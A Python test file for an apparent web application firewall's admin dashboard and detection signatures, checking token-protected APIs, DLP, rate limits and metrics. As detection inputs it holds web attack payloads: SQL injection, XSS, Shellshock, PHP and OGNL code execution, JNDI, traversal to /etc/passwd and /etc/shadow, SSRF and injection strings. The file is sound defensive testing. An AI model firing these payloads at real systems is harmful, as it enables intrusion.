"""
test_dataplane.py — 製品(ChickenNet L7 Security)の管理ダッシュボード + 単独バンドル検証
====================================================================================
  · 管理ダッシュボード(Web GUI)の制御API: 状態取得・トークン保護・ON/OFF・ルール・
    ハニーポット・エッジ前衛設定DL が動く。
偽シングルトンで実stateを汚さない([[feedback-verification-coverage-honesty]])。
"""
import json
import urllib.request

import dataplane.engine.lifeform.policy as FW
import dataplane.engine.lifeform.pipeline as ND
from dataplane.admin import AdminDashboard


def _req(url, token=None, body=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["X-Token"] = token
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(url, data=data, headers=headers,
                               method="POST" if data is not None else "GET")
    try:
        with urllib.request.urlopen(r, timeout=5) as resp:
            return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


def _admin_with_temp(tmp):
    FW._FW = FW.AppFirewall(state_dir=tmp)
    ND._SHIELD = ND.NetShield(state_dir=tmp)
    adm = AdminDashboard(host="127.0.0.1", port=0)
    info = adm.start()
    return adm, info["url"], adm.token


def test_dashboard_brand_honors_cover_env():
    # ステルス適用漏れ防止: CHICKENNET_COVER だけで(--stealth 無しでも)ダッシュボードのブランド/
    # タイトル/Server から製品名が消える(遮断ページと同じ秘匿源)。
    import os
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        os.environ["CHICKENNET_COVER"] = "System Health Monitor"
        adm, url, token = _admin_with_temp(tmp)
        try:
            _, html = _req(url + "/")
            assert b"System Health Monitor" in html
            assert b"ChickenNet" not in html          # 製品名が露見しない
        finally:
            os.environ.pop("CHICKENNET_COVER", None)
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_state_and_token():
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            # token無し → 401
            code, _ = _req(url + "/api/state")
            assert code == 401
            # token有り → 状態
            code, body = _req(url + "/api/state", token=token)
            assert code == 200
            st = json.loads(body)
            assert "firewall" in st and "shield" in st and "capabilities" in st
            # HTML(ダッシュボード)はtoken不要で取得できる
            code, html = _req(url + "/")
            assert code == 200 and b"ChickenNet L7 Security" in html
            # 総合ビューが論理セクションに整理されている(情報設計の回帰防止)
            assert html.count(b'class="sect"') == 6
            for label in ["概況", "脅威モニタリング", "WAF / 検知設定",
                          "アクセス制御・申立", "欺瞞", "詳細分析"]:
                assert label.encode() in html, label
            # 日英 i18n: 言語トグル + 辞書 + 適用関数 + 代表的な英訳が埋め込まれている
            for tk in [b'id="lang"', b"const JA2EN=", b"function applyStatic",
                       b"function setLang", "Threat monitoring".encode(),
                       "Egress DLP (secret leak)".encode()]:
                assert tk in html, tk
            # トークンは HTML/JS に埋め込まれない(XSS で抜かれない)
            assert token.encode() not in html
            r = urllib.request.urlopen(url + "/")
            # セキュリティヘッダ(深層防御)
            assert r.headers.get("X-Frame-Options") == "DENY"
            assert r.headers.get("X-Content-Type-Options") == "nosniff"
            assert "connect-src 'self'" in (r.headers.get("Content-Security-Policy") or "")
            # トークンは HttpOnly + SameSite=Strict Cookie で配られる
            sc = r.headers.get("Set-Cookie") or ""
            assert "chickennet_admin=" in sc and "HttpOnly" in sc and "SameSite=Strict" in sc
            # Cookie 認証でも通る(X-Token ヘッダ無し)
            req = urllib.request.Request(url + "/api/state",
                                         headers={"Cookie": f"chickennet_admin={token}"})
            assert urllib.request.urlopen(req, timeout=5).status == 200
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_deception_status_visualization():
    # #4 配線: デセプション(MTD)の状態とローテーション プレビューを可視化(env 駆動・状態レス)。
    import os
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            # HTML にパネル
            assert b'id="deception"' in _req(url + "/")[1] and "デセプション".encode() in _req(url + "/")[1]
            # 無効(既定)
            os.environ.pop("CHICKENNET_DECEPTION", None)
            d = json.loads(_req(url + "/api/deception", token=token)[1])
            assert d["enabled"] is False and d["preview"] == [] and d["family_count"] == 8
            # 有効化 → プレビュー4窓、隣接窓は必ず別系統(MTD)
            os.environ["CHICKENNET_DECEPTION"] = "1"
            try:
                d = json.loads(_req(url + "/api/deception", token=token)[1])
                assert d["enabled"] is True and len(d["preview"]) == 4
                fams = [p["family"] for p in d["preview"]]
                assert all(fams[i] != fams[i + 1] for i in range(len(fams) - 1))
                # Server は実在風の名簿から
                from dataplane.engine.services import banner as DC
                assert all(p["server"] in DC._SERVERS for p in d["preview"])
            finally:
                os.environ.pop("CHICKENNET_DECEPTION", None)
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_custom_signature_wiring():
    # 別evolution配線(#2 カスタムシグネチャ): GUI から追加/一覧/削除でき、ReDoS は拒否される。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            assert b'id="customsigs"' in html and "カスタムシグネチャ".encode() in html
            # 一覧(GET)に組込シグネチャと custom_blocked が出る
            sig = json.loads(_req(url + "/api/shield/signatures", token=token)[1])
            assert len(sig["builtin"]) >= 18 and sig["custom"] == []
            # 追加
            code, body = _req(url + "/api/shield/sig_add", token=token,
                              body={"name": "my-rule", "pattern": "evil-?bot"})
            assert code == 200 and json.loads(body)["ok"] is True
            sig = json.loads(_req(url + "/api/shield/signatures", token=token)[1])
            assert [c["name"] for c in sig["custom"]] == ["my-rule"]
            # ReDoS パターンは拒否(自己DoS防止)
            assert json.loads(_req(url + "/api/shield/sig_add", token=token,
                                   body={"name": "bad", "pattern": r"(a+)+$"})[1])["ok"] is False
            # 削除
            assert json.loads(_req(url + "/api/shield/sig_remove", token=token,
                                   body={"name": "my-rule"})[1])["ok"] is True
            sig = json.loads(_req(url + "/api/shield/signatures", token=token)[1])
            assert sig["custom"] == []
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_optional_signature_wiring():
    # 別evolution配線(#2 オプションシグネチャ): ダッシュボードから ssti/ssrf_internal/redirect を
    # 個別に検知対象/非対象へトグルでき、状態に反映される。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            assert b'id="optsigs"' in html and "追加シグネチャ".encode() in html
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert set(st["shield"]["optional_signatures"]) == {"ssti", "ssrf_internal", "redirect"}
            assert st["shield"]["cfg"]["optional_sigs"] == {}      # 既定は全OFF
            # ssti を ON
            code, body = _req(url + "/api/shield/optional_sig", token=token,
                              body={"name": "ssti", "on": True})
            assert code == 200 and json.loads(body)["ok"] is True
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert st["shield"]["cfg"]["optional_sigs"].get("ssti") is True
            # 不正名は拒否
            assert json.loads(_req(url + "/api/shield/optional_sig", token=token,
                                   body={"name": "bogus", "on": True})[1])["ok"] is False
            # 実際に検知挙動が変わる(ON で {{7*7}} がブロック方向)
            assert ND._SHIELD.inspect("203.0.113.61", path="/", query="n={{7*7}}").get("action") != "allow"
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_dlp_wiring():
    # evolution #6 配線: ダッシュボードから DLP の ON/OFF・アクション切替ができ、漏洩が
    # 状態(metrics/events)に出る。HTML にも DLP コントロールが存在する。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            # HTML に DLP コントロールが描画される
            _, html = _req(url + "/")
            assert b'id="dlp"' in html and "出口DLP".encode() in html and b'id="leaks"' in html
            # 既定は無効
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert st["shield"]["cfg"]["dlp_enabled"] is False
            # トグル+アクションを設定 → 反映される
            code, body = _req(url + "/api/shield/config", token=token,
                              body={"dlp_enabled": True, "dlp_action": "block"})
            assert code == 200 and json.loads(body)["ok"] is True
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert st["shield"]["cfg"]["dlp_enabled"] is True
            assert st["shield"]["cfg"]["dlp_action"] == "block"
            # 漏洩を記録 → metrics と events に出る(ダッシュボードが拾える)
            ND._SHIELD.note_leak("203.0.113.99", ["aws_access_key", "credit_card"])
            st = json.loads(_req(url + "/api/state", token=token)[1])
            assert st["shield_metrics"].get("dlp_leak", 0) >= 1
            leaks = [e for e in st["events"] if e.get("kind") == "dlp_leak"]
            assert leaks and "aws_access_key" in leaks[-1].get("kinds", [])
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_advanced_defenses_wiring():
    # #11〜#16 配線: ダッシュボードから 応答ヘッダ のトグルと paranoia 段階を
    # 操作でき、状態に反映される(バックエンドは既存 /api/shield/config + /api/shield/paranoia)。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            for cid in (b'id="sech"', b'id="paranoia"',
                        b'id="advstat"'):
                assert cid in html
            assert "詳細防御".encode() in html
            # 既定: すべてOFF / paranoia=1
            st = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert st["sec_headers_enabled"] is False
            assert st["paranoia"] == 1
            # トグルをON(既存 config エンドポイント)
            code, body = _req(url + "/api/shield/config", token=token,
                              body={"sec_headers_enabled": True})
            assert code == 200 and json.loads(body)["ok"] is True
            st = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert st["sec_headers_enabled"]
            # paranoia を段階設定 → optional_sigs も一括反映
            code, body = _req(url + "/api/shield/paranoia", token=token, body={"level": 3})
            assert code == 200 and json.loads(body)["paranoia"] == 3
            st = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert st["paranoia"] == 3
            assert st["optional_sigs"].get("redirect") and st["optional_sigs"].get("ssrf_internal")
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_path_limits_wiring():
    # #21 配線: ダッシュボードから per-path レート制限ルールを追加/削除でき、状態に反映される
    # (バックエンドは set_path_limits=検証/置換/永続化)。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            for cid in (b'id="pathlimits"', b'id="prpath"', b'id="prrate"',
                        b'id="prburst"', b'id="prlmeta"'):
                assert cid in html
            assert "パス別レート制限".encode() in html
            # 既定は空
            cfg = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert cfg["path_limits"] == []
            # 追加(不正項目混在=検証で除去・burst 既定=rate)
            code, body = _req(url + "/api/shield/path_limits", token=token,
                              body={"rules": [{"path": "/login", "rate": 0.5, "burst": 5},
                                              {"path": "", "rate": 1},          # 除去
                                              {"path": "/api/", "rate": 2}]})    # burst 既定=2
            assert code == 200 and json.loads(body)["ok"] is True
            pl = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]["path_limits"]
            assert [r["path"] for r in pl] == ["/login", "/api/"]
            assert pl[0]["burst"] == 5.0 and pl[1]["burst"] == 2.0
            # 1件だけ残す(クライアントは全リスト置換で削除を表現)
            code, _ = _req(url + "/api/shield/path_limits", token=token,
                           body={"rules": [{"path": "/login", "rate": 0.5, "burst": 5}]})
            assert code == 200
            pl = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]["path_limits"]
            assert [r["path"] for r in pl] == ["/login"]
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_dashboard_ops_policy_wiring():
    # #24/#25/#26 配線: throttle応答・サブネット防御・遮断メソッドをダッシュボードから操作でき、
    # 状態/専用エンドポイントに反映される。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            _, html = _req(url + "/")
            for cid in (b'id="throttle"', b'id="retryaft"', b'id="subnetdef"',
                        b'id="subthr"', b'id="blockmeth"', b'id="opsstat"'):
                assert cid in html
            assert "レート/メソッド/分散".encode() in html
            # サブネット状態の GET
            sn = json.loads(_req(url + "/api/shield/subnet", token=token)[1])
            assert sn["enabled"] is False and "hot_subnets" in sn
            # throttle / subnet を config 経由でトグル
            _req(url + "/api/shield/config", token=token,
                 body={"throttle_response": False, "subnet_defense": True, "subnet_threshold": 5})
            cfg = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert cfg["throttle_response"] is False and cfg["subnet_defense"] is True
            assert cfg["subnet_threshold"] == 5
            # 遮断メソッドを専用エンドポイントで設定(検証=大文字化/重複除去)
            code, body = _req(url + "/api/shield/blocked_methods", token=token,
                              body={"methods": ["trace", "TRACE", "options"]})
            assert code == 200 and json.loads(body)["blocked_methods"] == ["TRACE", "OPTIONS"]
            cfg = json.loads(_req(url + "/api/state", token=token)[1])["shield"]["cfg"]
            assert cfg["blocked_methods"] == ["TRACE", "OPTIONS"]
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_admin_token_cookie_not_handed_to_unauth_remote():
    # 脆弱性修正(#37): `/` は無条件で admin トークン Cookie を配っていた=非localhost公開時に
    # 誰でも GET / でトークンを取得し全制御APIを乗っ取れた。配布を localhost/認証済みに限定。
    import tempfile
    import urllib.request
    from dataplane.admin import _make_handler
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ok = _make_handler(adm)._may_set_token_cookie
            assert ok("127.0.0.1", False, "", token) is True          # localhost=配布
            assert ok("::1", False, "", token) is True
            assert ok("203.0.113.5", False, "", token) is False       # 無認証リモート=配らない(修正点)
            assert ok("203.0.113.5", True, "", token) is True         # 認証済みリモート=配布
            assert ok("203.0.113.5", False, token, token) is True     # ?token 正=ブートストラップ可
            assert ok("203.0.113.5", False, "wrong", token) is False  # ?token 誤=配らない
            # 回帰: localhost からの GET / は従来どおり Cookie を受け取れる(管理UXは不変)
            r = urllib.request.urlopen(url + "/", timeout=5)
            cookies = [v for (k, v) in r.getheaders() if k.lower() == "set-cookie"]
            assert any("chickennet_admin=" in c for c in cookies)
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_metrics_exposition_endpoint():
    # 観測性: /api/metrics が plain-text 露出形式でスクレイプ可能(token必須)。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        ofw, osh = FW._FW, ND._SHIELD
        adm, url, token = _admin_with_temp(tmp)
        try:
            ND._SHIELD.enable()
            assert _req(url + "/api/metrics")[0] == 401          # 認証必須
            ND._SHIELD.inspect("203.0.113.5", path="/", query="x=1")
            code, body = _req(url + "/api/metrics", token=token)
            assert code == 200
            text = body.decode()
            assert "# TYPE chickennet_requests_total counter" in text
            assert "chickennet_requests_total " in text
            assert "chickennet_shield_enabled 1" in text
            assert "chickennet_paranoia_level 1" in text
            # #25 サブネット集約防御の観測性(#28 で露出)
            assert "# TYPE chickennet_subnet_flag_total counter" in text
            assert "chickennet_hot_subnets 0" in text and "chickennet_tracked_subnets 0" in text
            # シグネチャヒットはラベル付きカウンタで出る
            ND._SHIELD.inspect("203.0.113.6", path="/", query="1 union select a from b")
            text2 = _req(url + "/api/metrics", token=token)[1].decode()
            assert 'chickennet_sig_hits_total{signature="sqli"}' in text2
        finally:
            adm.stop()
            FW._FW, ND._SHIELD = ofw, osh


def test_semantic_tautology_catches_value_swapped_sqli():
    # evolution #2 頭金: literal "1=1" をすり抜ける 2=2 / 99=99 / 'a'='a' を *構造* で捕捉。
    from dataplane.engine.lifeform.pipeline import (
        _tautology_suspect, _normalize_for_scan)
    for s in ["2=2", "99=99", "' or 1=1--", "'a'='a'", "x' or '7'='7"]:
        assert _tautology_suspect(_normalize_for_scan(s)) is True, s
    # evolution #2 step 3: = 限定を卒業し、不等式の恒真式(OR 1=1 の WAF 回避亜種)も構造で捕捉
    for s in ["2>1", "1<2", "1>=1", "5<=5", "0<>1", "9!=8",
              "' or 1<2--", "x' or 2 > 1 -- "]:
        assert _tautology_suspect(_normalize_for_scan(s)) is True, s
    for s in ["id=5", "1=2", "user=admin", "a=b", "ratio=16x9",
              "5>9", "1<1", "2>3", "price>100", "1.5<2", "v1<2"]:
        assert _tautology_suspect(_normalize_for_scan(s)) is False, s  # 誤検知しない
    # スタッククエリ(複文): needle 未収載の ;update も構造で捕捉
    from dataplane.engine.lifeform.pipeline import _stacked_query_suspect
    assert _stacked_query_suspect(_normalize_for_scan("1;update users set p=1")) is True
    assert _stacked_query_suspect(_normalize_for_scan("a;b;c")) is False
    # inspect 経由でも(literalシグネチャに無い 2=2 / ;update が)スコア加点される
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        # 既存 needle(--/union 等)を含まない純粋な恒真式=従来は素通り、意味検知が拾う
        d = sh.inspect("198.51.100.30", path="/login", query="q=2=2")
        assert "sqli-tautology" in d.get("reason", "")
        d2 = sh.inspect("198.51.100.31", path="/p", query="id=1;update u set p=1")
        assert "sqli-stacked" in d2.get("reason", "")


def test_method_telemetry_breakdown():
    # evolution #7 拡張: メソッド別(攻撃者入力ゆえ既知名のみ+OTHER畳み)の累積内訳。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        sh.inspect("1.0.0.1", path="/", method="GET")
        sh.inspect("1.0.0.2", path="/", method="POST")
        sh.inspect("1.0.0.3", path="/", method="post")     # 小文字→正規化
        sh.inspect("1.0.0.4", path="/", method="ZZ;evil")  # 不正→OTHER(辞書肥大防止)
        m = sh.metrics()
        assert m["method_hits"] == {"GET": 1, "POST": 2, "OTHER": 1}


def test_zone_telemetry_breakdown_and_public_trend():
    # evolution #7 拡張: 同じテレメトリ基盤をゾーン別へ。累積ゾーン内訳(zone_hits)+
    # 外部(public)推移(series の pub)を出す。アクション別は既存メトリクスで充足。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        sh.inspect("203.0.113.9", path="/", query="a", zone="public")
        sh.inspect("203.0.113.9", path="/", query="b", zone="public")
        sh.inspect("10.0.0.5", path="/", query="c", zone="private")
        sh.inspect("127.0.0.1", path="/", query="d", zone="loopback")
        m = sh.metrics()
        assert m["zone_hits"] == {"public": 2, "private": 1, "loopback": 1}
        # アクション別は既存メトリクスにある(ダッシュボードはこれを横棒で描く)
        assert all(k in m for k in ("allow", "throttle", "challenge", "block"))
        sh._series_last = 0.0
        s = sh.series(2)
        assert s[-1].get("pub") == 2          # 外部トラフィックの累積→クライアントが差分で推移描画


def test_signature_hit_telemetry_breakdown_and_series():
    # evolution #7 拡張: 同じテレメトリ基盤をシグネチャ検知にも。累積カテゴリ別ヒット(sig_hits)
    # と時系列(series の sig_total)を出す。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        for q in ["a union select b from c", "x=../../etc/passwd", "q=<script>alert(1)",
                  "z=1 union select 2 from d"]:
            sh.inspect("5.5.5.5", path="/", query=q)
        m = sh.metrics()
        assert m["sig_hits"].get("sqli", 0) == 2          # union select ×2
        assert m["sig_hits"].get("traversal", 0) == 1 and m["sig_hits"].get("xss", 0) == 1
        sh._series_last = 0.0
        s = sh.series(3)
        assert s[-1].get("sig_total") == sum(m["sig_hits"].values()) == 4


def test_dlp_telemetry_kinds_breakdown_and_series():
    # evolution #7: 漏洩テレメトリ。種別内訳(dlp_kinds)と時系列(series の dlp_leak)を出す。
    import tempfile
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        sh.cfg["dlp_enabled"] = True
        sh.note_leak("1.1.1.1", ["aws_access_key", "credit_card"])
        sh.note_leak("2.2.2.2", ["aws_access_key"])
        sh.note_leak("3.3.3.3", ["private_key"])
        m = sh.metrics()
        assert m["dlp_leak"] == 3
        assert m["dlp_kinds"] == {"aws_access_key": 2, "credit_card": 1, "private_key": 1}
        # 時系列サンプルに dlp_leak(累積)が含まれる → クライアントが差分でトレンド描画
        sh._series_last = 0.0
        s = sh.series(5)
        assert "dlp_leak" in s[-1] and s[-1]["dlp_leak"] == 3


def test_egress_dlp_secret_leak_scanner():
    # evolution #6: 出口DLP。応答に混入した秘密情報(鍵/トークン/Luhn検証クレカ)を検出。
    import tempfile
    from dataplane.engine.lifeform.pipeline import scan_secret_leak
    assert scan_secret_leak("key=AKIA1234567890ABCDEF") == ["aws_access_key"]
    assert scan_secret_leak("g=AIza" + "b" * 35) == ["google_api_key"]
    assert scan_secret_leak("gh=ghp_" + "a" * 36) == ["github_token"]
    assert scan_secret_leak("st=sk_live_" + "A" * 24) == ["stripe_secret"]
    assert scan_secret_leak("-----BEGIN RSA PRIVATE KEY-----") == ["private_key"]
    assert scan_secret_leak(b"card 4242 4242 4242 4242") == ["credit_card"]   # Luhn OK
    assert scan_secret_leak("amex 378282246310005") == ["credit_card"]
    # 誤検知しない: 普通のJSON/電話/接頭外や非Luhnの数字列/短い AKIA
    for d in ['{"user":"alice","id":42}', "order 1234567890", "phone 0312345678",
              "AKIAshort", "id=1234567890123456", "n=1111222233334444"]:
        assert scan_secret_leak(d) == [], d
    # DLP は既定OFF=スキャンしない。有効化で動く。設定は永続化。
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        assert sh.dlp_active() is False
        assert sh.scan_leak("key=AKIA1234567890ABCDEF") == []     # OFF=空
        sh.cfg["dlp_enabled"] = True
        sh._save()
        assert sh.dlp_active() is True
        assert sh.scan_leak("key=AKIA1234567890ABCDEF") == ["aws_access_key"]
        r = sh.note_leak("203.0.113.90", ["aws_access_key", "aws_access_key"])
        assert r["action"] == "audit" and r["kinds"] == ["aws_access_key"]   # 重複除去
        assert sh._metrics.get("dlp_leak", 0) >= 1
        sh2 = ND.NetShield(state_dir=tmp)                          # 永続化を確認
        assert bool(sh2.cfg.get("dlp_enabled")) is True


def test_custom_decoder_seam_for_proprietary_encoding():
    # evolution #2 深掘り(独自暗号化型): アプリ固有エンコードの復号 callable を登録すれば、
    # 走査面で復号され全シグネチャが効く。可逆(clear で解除)。壊れたデコーダでも防御は止めない。
    import codecs
    from dataplane.engine.lifeform.pipeline import (
        _normalize_for_scan, _SIG_RE, register_scan_decoder, clear_scan_decoder,
        registered_scan_decoders)
    def hits(s):
        b = _normalize_for_scan(s)
        return {n for n, r in _SIG_RE if r.search(b)}
    payload = codecs.encode("<script>alert(1)", "rot13")     # 独自エンコード例(ROT13)
    assert "xss" not in hits(payload)                        # 登録前は復号されず素通り
    try:
        register_scan_decoder("rot13", lambda s: codecs.decode(s, "rot13"))
        assert "rot13" in registered_scan_decoders()
        assert "xss" in hits(payload)                        # 登録後は復号されて検知
        # 壊れたデコーダを足しても例外で防御は止まらず、他デコーダ/正規化は機能する
        register_scan_decoder("boom", lambda s: (_ for _ in ()).throw(RuntimeError("x")))
        assert "xss" in hits(payload)
    finally:
        clear_scan_decoder("rot13")
        clear_scan_decoder("boom")
    assert "xss" not in hits(payload)                        # 解除後は元通り(可逆)
    assert registered_scan_decoders() == []


def test_server_i18n_block_page_ja_en():
    # i18n 続行: サーバ生成の遮断ページを CHICKENNET_LANG(ja|en)で切替(end-user 向け多言語)。
    import os
    from dataplane.engine.core import i18n
    from dataplane.engine.services.proxy import _block_page
    info = {"appeal_available": True, "remain_sec": 120, "appeal_after_sec": 60}
    _orig_loc = i18n._locale_lang
    try:
        os.environ.pop("CHICKENNET_LANG", None)
        i18n._locale_lang = lambda: ""        # #84: ロケール非依存にして検証(env無し→既定 ja)
        assert i18n.lang() == "ja"
        ja = _block_page(info).decode("utf-8")
        assert "lang='ja'" in ja and "解除をリクエスト" in ja
        i18n._locale_lang = lambda: "en"      # 英語ロケールなら env 無しでも自動 en
        assert i18n.lang() == "en"
        i18n._locale_lang = _orig_loc
        os.environ["CHICKENNET_LANG"] = "en"
        assert i18n.lang() == "en"
        en = _block_page(info).decode("utf-8")
        assert "lang='en'" in en and "Request unblock" in en
        assert "解除" not in en          # 英語時に日本語が混ざらない(主要文言)
        # 数値埋め込みの合成文(残BAN時間)も翻訳テンプレートで出る
        when = _block_page({"remain_sec": 120, "appeal_after_sec": 60}).decode("utf-8")
        assert "available in about 60s" in when and "ban remaining: about 120s" in when
        # 未登録 key は ja フォールバック
        assert i18n.t("nope.key", lang_="en") == "nope.key"
    finally:
        os.environ.pop("CHICKENNET_LANG", None)
        i18n._locale_lang = _orig_loc


def test_unicode_evasion_is_normalized():
    # evolution #2 深掘り(ヒエログリフ/絵文字罠): 全角・ゼロ幅・書式制御・\uXXXX/\xXX で
    # 見た目だけ変えた回避を NFKC 正規化+不可視文字除去+エスケープ復号で実体へ戻して捕捉。
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    def hits(s):
        b = _normalize_for_scan(s)
        return {n for n, r in _SIG_RE if r.search(b)}
    assert "xss" in hits("＜ｓｃｒｉｐｔ＞alert(1)")            # 全角 <script>
    assert "sqli" in hits("1 ＵＮＩＯＮ ＳＥＬＥＣＴ a from b")  # 全角 UNION SELECT
    assert "xss" in hits("<scr​ipt>alert(1)")          # ゼロ幅スペース挿入
    assert "sqli" in hits("1 uni‌on select a from b")  # ゼロ幅非接合子
    assert "jndi" in hits("${jn­di:ldap://e}")         # ソフトハイフン挿入(jndi)
    bs = chr(92)                                            # バックスラッシュ(\u/\x をソースに直書きしない)
    assert "xss" in hits("".join(bs + "u%04x" % ord(c) for c in "<script>"))  # \uXXXX
    assert "xss" in hits("".join(bs + "x%02x" % ord(c) for c in "<script>"))  # \xXX
    # benign Unicode(日本語/絵文字/全角/アクセント)は誤検知しない
    for s in ["?q=こんにちは", "?name=café",
              "?e=\U0001F44D\U0001F389", "?city=Ｔｏｋｙｏ"]:
        assert hits(s) == set(), s


def test_ssi_ldap_mailheader_and_obfuscated_loopback():
    # evolution #2 深掘り(隠していた小粒): SSI/LDAP/メールヘッダ注入=低FP常時ON、
    # 難読化ループバック SSRF と ${...} SSTI は ssrf_internal/ssti(オプション)に統合。
    import tempfile
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    assert rgx["ssi"].search(_normalize_for_scan('x=<!--#exec cmd="id"-->'))          # SSI
    assert rgx["ldapi"].search(_normalize_for_scan("u=admin)(|(uid=*))"))             # LDAP
    assert rgx["ldapi"].search(_normalize_for_scan("u=*)(uid=*)"))
    assert rgx["crlf"].search(_normalize_for_scan("to=a%0aBcc:evil@x"))               # mail header
    # 難読化ループバック / ${...}SSTI は optional regex として当たる(評価は cfg ON 時のみ)
    assert rgx["ssrf_internal"].search(_normalize_for_scan("u=http://0x7f000001/x"))
    assert rgx["ssrf_internal"].search(_normalize_for_scan("u=http://2130706433/x"))
    assert rgx["ssti"].search(_normalize_for_scan("z=${7*7}"))
    # 低誤検知: (a)(b) / ${user.name} / 部分10進 / 0xFF / 通常コメントは flag しない
    for s in ["?math=(a)(b)", "?n=${user.name}", "?ver=2130706", "?hex=0xFF", "?c=<!-- hi -->"]:
        b = _normalize_for_scan(s)
        assert not any(rgx[n].search(b) for n in ("ssi", "ldapi", "crlf", "ssrf_internal", "ssti")), s


def test_shellshock_php_ognl_traversal_extensions_and_redirect_optional():
    # evolution #2 深掘り(在庫払底): Shellshock/PHPコード/OGNL/追加LFI標的=低FP常時ON、
    # オープンリダイレクト(=//)=高FPオプション。
    import tempfile
    from dataplane.engine.lifeform.pipeline import _normalize_for_scan, _SIG_RE
    rgx = dict(_SIG_RE)
    assert rgx["rce"].search(_normalize_for_scan("ua=() { :;}; /bin/cat /etc/x"))   # Shellshock
    assert rgx["rce"].search(_normalize_for_scan("x=<?php system(1)?>"))            # PHP code
    assert rgx["rce"].search(_normalize_for_scan("x=<?= 1 ?>"))
    assert rgx["ognl"].search(_normalize_for_scan("x=%{(#_memberAccess[1]=1)}"))    # OGNL/Struts2
    assert rgx["ognl"].search(_normalize_for_scan("x=@java.lang.Runtime@getRuntime()"))
    assert rgx["traversal"].search(_normalize_for_scan("f=/etc/shadow"))
    assert rgx["traversal"].search(_normalize_for_scan("p=/x/..;/manager/html"))    # Tomcat ..;/
    assert rgx["traversal"].search(_normalize_for_scan("f=win.ini"))
    # 低誤検知: <?xml 宣言 / darwin.ini / runtime 単語 / report.ini は flag しない
    for s in ["?q=<?xml version=1?>", "?file=darwin.ini", "?name=runtime", "?file=report.ini"]:
        b = _normalize_for_scan(s)
        assert not rgx["rce"].search(b) and not rgx["ognl"].search(b) and not rgx["traversal"].search(b), s
    # オープンリダイレクト(=//)は既定OFF、有効化で検知。良性 //cdn 参照を既定で誤遮断しない。
    with tempfile.TemporaryDirectory() as tmp:
        sh = ND.NetShield(state_dir=tmp)
        sh.enable()
        assert sh.inspect("203.0.113.80", path="/", query="next=//evil.com/x").get("action") == "allow"
        assert sh.set_optional_signature("redirect", True).get("ok") is True
